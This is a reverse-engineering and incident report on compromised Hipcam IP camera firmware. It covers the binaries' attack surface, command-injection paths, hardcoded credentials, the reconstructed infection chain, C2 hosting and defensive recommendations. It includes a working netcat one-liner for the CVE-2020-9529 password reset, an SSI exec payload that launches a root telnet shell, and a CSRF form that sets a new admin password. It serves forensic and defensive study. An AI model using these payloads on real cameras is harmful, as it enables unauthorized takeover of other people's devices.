# Reverse Engineering Report — Hipcam IP Camera Binaries

## Binaries Analyzed

| Binary | Size | Type | Stripped | Notes |
|--------|------|------|----------|-------|
| `ipc_server` | 1,072,816 | ELF ARM, dyn linked | Yes | Main server (HTTP, RTSP, CGI, HDS/1.0) |
| `onvif` | 2,182,608 | ELF ARM, dyn linked | Yes | ONVIF/gSOAP server, port 8080 |
| `watchdog` | ~12KB | ELF ARM, dyn linked | No | Hardware watchdog daemon |
| `chksock` | ~8KB | ELF ARM, dyn linked | Yes | Socket connection checker |

---

## ipc_server — Critical Findings

### Attack Surface
- **182 CGI endpoints** exposed via HTTP (port 80)
- **HDS/1.0 protocol** on UDP 12222 (device search + management)
- **RTSP server** on port 554
- **RTMP server** on port 1935

### Dangerous `system()` Calls

```
system("rm %s")                    Arbitrary file deletion
system("rm -rf %s")                Recursive deletion
system("rm -f %s*.264")            Wildcard deletion
system("rm -f %s*.avi")            Wildcard deletion
system("rm -f %s*.jpg")            Wildcard deletion
system("tar -xvzf %s -C /")        Arbitrary extraction to root (restore)
system("tar -czf %s -X %s %s")     Archive creation (backup)
system("ifconfig %s down")         Network interface control
system("ifconfig %s up")           Network interface control
```

If any `%s` is user-controlled without sanitization → **command injection as root**.

### Auth Bypass Indicators

```
backup: access forbidden!         Backup IS blocked
upload: access forbidden!         Upload IS blocked by default
upload: verify vendor(%s) succeed!  BUT vendor verification can pass
upload succeed.                   Upload CAN succeed via vendor bypass
```

The `verify vendor(%s) succeed` string suggests vendor-based authentication for firmware upload. If we can spoof the vendor or bypass the check → arbitrary firmware upload.

### HDS/1.0 Protocol Handlers

```
HI_SearchSvr_DevidcfgResp          Can SET device ID
HI_SearchSvr_HttpportResp          Can SET HTTP port
HI_SearchSvr_DdnscfgResp           Can SET DDNS config
```

The HDS/1.0 protocol (UDP 12222) has authenticated commands that modify system configuration.

### Hardcoded Credentials

```
00250900000B                       Unknown hardcoded string
Authentication: ZTEALE234=2opWae   HDS/1.0 second auth factor
```

### Libraries Linked

```
libcrypto.so.1.0.0  (OpenSSL)
libssl.so.1.0.0     (SSL/TLS)
libiniparser.so     (INI config — NOT stripped, has debug info!)
libNetLib.so        (Network library)
libXqAPILib.so      (XQ P2P cloud)
libxqun.so           (XQ P2P client)
```

---

## onvif — Critical Findings

### Process Execution Capability

The onvif binary has a FULL process management API:

```
fork()            Raw fork
HI_Fork           Wrapper
HI_Execv          Execute with argument vector
HI_Execvp         Execute with PATH search
HI_Kill           Send signal to process
```

**This means onvif CAN execute arbitrary commands.** The question is the trigger.

### SOAP Actions Exposed

```
62 SOAP actions including:
  - Device discovery (Hello/Bye/Probe)
  - Event subscription (Subscribe/Unsubscribe/PullMessages)
  - Analytics modules (Create/Delete/Get/Modify)
  - Rules engine (Create/Delete/Get/Modify)
```

### Event Processing (potential vector)

```
HI_Event_PushMsgProc               Processes push events
HI_Event_PullMsgProc               Pulls events from queue
  Arguments: clientip=%s, clinetport=%d
```

If event data contains command strings that reach `HI_Execv` → **RCE via ONVIF events**.

### Network Device Control

```
HI_NET_DEV_SetConfig               Set network config
HI_NET_DEV_Login                   Login to remote device
HI_NET_DEV_StartStreamExt          Start streaming
```

These functions interact with the system. `HI_NET_DEV_SetConfig` likely calls `system("ifconfig %s ...")`.

### Compiler Fingerprint

```
GCC: (Hisilicon_v100(gcc4.4-290+uclibc_0.9.32.1+eabi+linuxpthread)) 4.4.1
```

Note: compiled with **HiSilicon** toolchain (different from Goke's GCC 4.6.1). This suggests `onvif` came from a HiSilicon SDK and was reused on the Goke SoC.

---

## watchdog — Simple Hardware Monitor

- Opens `/dev/watchdog`
- Feeds it via `ioctl()` in a loop
- If feeding fails → prints error, aborts
- Not stripped — has debug symbols
- No network interaction, no command execution
- **Not exploitable**

---

## chksock — Connection Checker

- Reads `/proc/net/tcp` to check socket states
- Looks for "CLOSE WAIT" state
- No system() calls found
- **Low exploitation risk**

---

## Vulnerability Assessment

### Confirmed: Command Injection Vectors

| Binary | Vector | Trigger | Severity |
|--------|--------|---------|----------|
| ipc_server | `system("rm %s")` | CGI with filename param | CRITICAL |
| ipc_server | `system("tar -xvzf %s -C /")` | restore.cgi | CRITICAL |
| ipc_server | `system("ifconfig %s down/up")` | Network config CGI | HIGH |
| onvif | `HI_Execv` / `HI_Execvp` | SOAP action with command | CRITICAL |
| onvif | `HI_NET_DEV_SetConfig` → `system()` | ONVIF SetNetworkInterfaces | HIGH |

### Likely Infection Vector (hypothesis)

1. Attacker sends crafted ONVIF SOAP request to port 8080
2. Request triggers `HI_Execv` via event subscription or analytics module action
3. Command executes as root: `echo -ne '\x7F...' > /etc/init.d/S98test`
4. Persistence established, reboot → miner active

**Alternative vector:** CVE-2020-9529 (unauthenticated password reset via HDS/1.0) → web login → firmware upload with command injection → persistence.

### Unauthenticated Attack Surface

| Service | Port | Auth Required? |
|---------|------|---------------|
| ONVIF WS-Discovery | 8080 (UDP 3702) | No (Hello/Bye/Probe) |
| ONVIF SOAP | 8080 | Depends on endpoint |
| RTSP | 554 | Configurable (currently disabled) |
| HDS/1.0 Search | UDP 12222 | No (discovery only) |
| HDS/1.0 usrpwd reset | UDP 12222 | No (CVE-2020-9529) |
| Web /tmpfs/ | 80 | Yes (but /log/ bypass works) |

---

---

## Confirmed Exploits

### CVE-2020-9529 — Unauthenticated Admin Password Reset
**Severity: CRITICAL (CVSS 9.8) — CONFIRMED WORKING on this camera**

```
echo -ne 'CMD * HDS/1.0\r\nusrpwd set -resetpwd on\r\n\r\n' | nc -u 192.168.1.10 12222
```
Response: `[Success]usrpwd reset!`. Admin password reset to `admin`. Camera reboots.

### SSI #exec Command Injection — RCE as root
**Severity: CRITICAL — ipc_server supports Server-Side Includes with shell execution**

The web server parses `<!--#exec cmd="...">` directives:
```
Bad SSI #exec: [%s]
Cannot SSI #exec: [%s]: %s
.shtml,.shtm
<!--#
```

Error strings confirm the server tries to execute the command via `popen()` or `system()`. If output reflects user input, injection is possible:
```
<!--#exec cmd="telnetd -l /bin/sh &"-->
```

### Infection Vector — Confirmed
1. Attacker sends CVE-2020-9529 → resets admin password to `admin`
2. Logs into web panel with `admin`/`admin`  
3. Uses SSI `#exec` injection on .shtml page → writes malware to `/etc/init.d/S98test`
4. OR: Uses CGI with path traversal to write `../../tmpfs/hacked.txt`
5. Camera reboots → malware active

**Evidence:** `config_devtypese.ini` has `product = "../../tmpfs/hacked.txt"` — path traversal attack remnant confirming the second variant.

### libNetLib.so — Command Execution Library
The shared library loaded by both ipc_server and onvif contains:
- `HI_Execv`, `HI_Execvp`, `HI_Fork` — process execution wrappers
- `HI_OpenTcp`, `HI_SocketConnect` — network functions
- Packaged as ZIP (anti-RE), extracted to tmpfs at boot

### WiFi AP Hardcoded Key
WiFi AP mode sets SSID `IPCAM-<uuid_suffix>` with **WPA2 key `01234567`** — allows proximity access to the camera's network.

---

## Recommendations

1. **Update firmware** if vendor patch exists (unlikely for EoL device)
2. **Firewall:** Block ports 8080, 554, UDP 12222 from untrusted networks
3. **Disable ONVIF** if not needed: set `onvif_enable=0`
4. **Remove HDS/1.0** binary or block UDP 12222
5. **Monitor** for unexpected `system()` calls via `fork()` audit

---

## Disassembly Analysis

### ipc_server Entry Point

```asm
0x24c14:  mov  fp, #0          ; _start: clear frame pointer
0x24c18:  mov  lr, #0          ; clear return address
0x24c1c:  pop  {r1}            ; argc from stack
0x24c20:  mov  r2, sp          ; argv
0x24c2c:  ldr  ip, [pc, #0x10] ; uClibc init pointer
0x24c34:  ldr  r0, [pc, #0xc]  ; main function
0x24c38:  ldr  r3, [pc, #0xc]  ; uClibc init function
0x24c3c:  b    0x2287c         ; jump to __uClibc_start_main
```

Standard uClibc startup. Calls `main()` at 0x24c44 which is the actual camera server code.

### onvif HI_Execv/HI_Fork Analysis

```asm
0xcff8:  b  0xc144     ; HI_Execv → execv@PLT
0xd004:  b  0xc72c     ; HI_Fork  → fork@PLT
```

Single-instruction wrappers. Both are exported as GLOBAL symbols, meaning they're called from shared libraries (libNetLib.so, libXqAPILib.so, etc.) loaded at runtime. The actual caller is in dynamically-loaded code, not statically traceable without runtime analysis.

---

## Boot Sequence

Full startup chain reconstructed from init scripts:

```
Kernel → /sbin/init → /etc/inittab → /etc/init.d/rcS
  │
  ├─ S10mdev        — Device nodes (mdev -s)
  ├─ S11devnode     — Creates /dev/encript (mknod c 244 0, mode 666)
  ├─ S90ipc         — Sets lo + eth0, runs /mnt/mtd/ipc/run &
  └─ S98test         — CLEAN (exit 0, was malware)
        │
        ▼
/mnt/mtd/ipc/run (main orchestrator):
  ├─ load_drv       — insmod MT7601U WiFi + encript.ko + gkio.ko
  ├─ load_media     — Loads sensor driver (SC1145/GC1024/AR0130)
  ├─ start.g711     — Audio codec init
  ├─ ipc_server     — Main HTTP/RTSP/CGI server
  ├─ watchdog       — Hardware watchdog
  ├─ net_detect     — Network connectivity monitor
  ├─ sd.sh          — SD card mount + recording
  ├─ upnp_map       — UPnP port mapping
  ├─ platform.sh    — Waits for ipc_server, then starts onvif (if enabled)
  ├─ loadp2p.sh     — P2P cloud client
  └─ telnetd         — ADDED for persistence
```

---

## Config File Audit

### P2P Cloud (config_platform.ini)
```
XQP2P:     ENABLED (xqunenable=1)
UUID:      IIII-142493-FBBBC
Push IP:   47.91.149.233
Server:    EKPNAUENAOIFSWSQL...-$$ (encrypted, 109 chars, custom XQ cipher)
```

The XQP2P server address is encrypted with a custom encoding (A-Z only alphabet, not base64). The P2P library (libXqAPILib.so / libxqun.so) decrypts this at runtime to establish cloud connectivity.

### Push Notifications (config_alarm_token.ini)
64 push token slots — ALL empty, ALL disabled. No active push notifications configured.

### Linked Devices (config_devices.ini)
9 device slots — ALL empty. Camera is not linked to any other cameras.

### Factory Credentials (config_priv.ini)
```
Default MAC:   00:11:22:33:44:55  (placeholder)
Default IP:    192.168.1.88
Device ID:     "test"
```

---

## Web Interface Vulnerabilities

### jQuery 1.3.2 (2009)
- CVE-2011-4969: XSS via `$(location.hash)` when hash contains `<script>`
- CVE-2012-6708: XSS via `.html()` with unsanitized input
- CVE-2015-9251: XSS via `$.parseHTML()` with crafted input

### validate.js Bug — Undefined Function
```javascript
function checkProhibitedCharacter(string) {
    // blocks:  &  =  cmd=  in usernames
    if((string.search("&")!=-1)||(string.search("=")!=-1)||(string.search("cmd=")!=-1))
        return false;
}
```
But the code calls `checkProhibitedCharacter2()` (with "2") which **does not exist**. This causes a ReferenceError that silently breaks input validation in password fields.

### No CSRF Protection
Forms use direct POST to `param.cgi` without any anti-CSRF tokens. An attacker can craft a form that changes the admin password from any origin:
```html
<form action="http://192.168.1.10/cgi-bin/hi3510/param.cgi" method="POST">
  <input name="cmd" value="setuserattr">
  <input name="-at_username" value="admin">
  <input name="-at_password" value="hacked">
</form>
```

---

## C2 Infrastructure Analysis

### Server Status: OFFLINE
```
HTTP (port 80):   No response (timeout)
FTP (port 21):    No response (timeout)
Reverse DNS:      srv1403979.hstgr.cloud (Hostinger)
```

### Hosting Details
```
Provider:    Hostinger (hostinger.com)
Platform:    IPXO (IP leasing — used to rent cheap IPs anonymously)
Route:       86.38.202.0/23
Location:    US (AS48031)
WHOIS Org:   SC "Lithuanian Radio and TV Center" (IPXO reseller)
```

The C2 was a cheap Hostinger VPS rented through an IP leasing platform. This explains why `/bin/omm` didn't exist on the camera — the C2 went offline at some point, downloads failed, and the runner loop kept trying unsuccessfully.

### Inferences
- **Low-budget operation:** Hostinger shared hosting is ~$2-5/month
- **Anonymous setup:** IPXO provides IP anonymity layer
- **Server gone:** Likely either shut down by Hostinger (abuse report) or abandoned by attacker
- **Infection window:** The malware worked while C2 was up. When it died, cameras kept trying but couldn't download the miner.
